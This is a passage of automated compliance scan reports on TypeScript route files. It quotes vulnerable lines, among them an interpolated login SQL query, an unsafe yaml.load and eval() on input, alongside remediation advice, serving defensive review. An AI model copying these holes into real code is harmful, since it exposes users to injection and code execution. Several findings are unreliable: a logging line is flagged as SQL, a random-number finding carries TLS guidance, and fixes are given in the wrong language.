#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 220
logger.warn('Error during metrics update loop: + ' + utils.getErrorMessage(e))
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [HDR-M-002](https://verify.example-org.internal/?id=HDR-M-002) | No Server Banners |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🔴 Critical | [SAST-M-002](https://verify.example-org.internal/?id=SAST-M-002) | Secure File Upload Validation |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 220, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/login.ts`
**Scanned at**: 2026-10-11T16:33:09.012024+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 34 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 34
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: tru...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🟠 High | [SECR-M-003](https://verify.example-org.internal/?id=SECR-M-003) | Enforce Temporary Credentials and Credential Rotation in CI/CD |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [SECR-M-004](https://verify.example-org.internal/?id=SECR-M-004) | Short-Lived Credentials & Rotation |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 34, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/fileUpload.ts`
**Scanned at**: 2026-10-11T16:33:11.910082+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-004](https://verify.example-org.internal/?id=SAST-M-004) | Prevent Insecure Deserialization | 109 |

#### [SAST-M-004](https://verify.example-org.internal/?id=SAST-M-004) — Insecure deserialization detected
```ts
// Line 109
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```
**Suggested fix:**
```ts
# Suggested fix: use safe deserialisation alternatives
import json, yaml
# WRONG:  data = pickle.loads(user_bytes)  — arbitrary code execution
data = json.loads(user_bytes)         # prefer JSON for untrusted input
# WRONG:  config = yaml.load(stream)
config = yaml.safe_load(stream)       # safe_load disables Python object tags
```
> 💡 **Why**: Risk: This is one of the most critical vulnerabilities, often leading directly to Remote Code Execution (RCE). An attacker can craft a malicious object that, when deserialized, executes arbitrary commands on the server.
> 🔧 **Guidance**: A developer must avoid using dangerous functions like `ObjectInputStream.readObject` on untrusted data, or must implement a secure, whitelisting deserialization proxy.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-004)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [SAST-M-002](https://verify.example-org.internal/?id=SAST-M-002) | Secure File Upload Validation |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [LOG-M-004](https://verify.example-org.internal/?id=LOG-M-004) | Trusted Time Synchronization for Security Events |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-004", "severity": "HIGH", "line": 109, "message": "Insecure deserialization detected", "fix_snippet": "# Suggested fix: use safe deserialisation alternatives\nimport json, yaml\n# WRONG:  data = pickle.loads(user_bytes)  \u2014 arbitrary code execution\ndata = json.loads(user_bytes)         # prefer JSON for untrusted input\n# WRONG:  config = yaml.load(stream)\nconfig = yaml.safe_load(stream)       # safe_load disables Python object tags"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/captcha.ts`
**Scanned at**: 2026-10-11T16:33:14.514035+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (2)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 22 |
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 14 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 22
const answer = eval(expression).toString() // eslint-disable-line no-eval
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 14
const firstTerm = Math.floor((Math.random() * 10) + 1)
// Line 15
const secondTerm = Math.floor((Math.random() * 10) + 1)
// Line 16
const thirdTerm = Math.floor((Math.random() * 10) + 1)
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [SAST-M-003](https://verify.example-org.internal/?id=SAST-M-003) | Disable XXE Processing |
| 🔴 Critical | [SECR-M-005](https://verify.example-org.internal/?id=SECR-M-005) | No Secrets in Build Logs |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |

_+ 54 more applicable mandards — [view all 62 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 22, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}, {"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 14, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
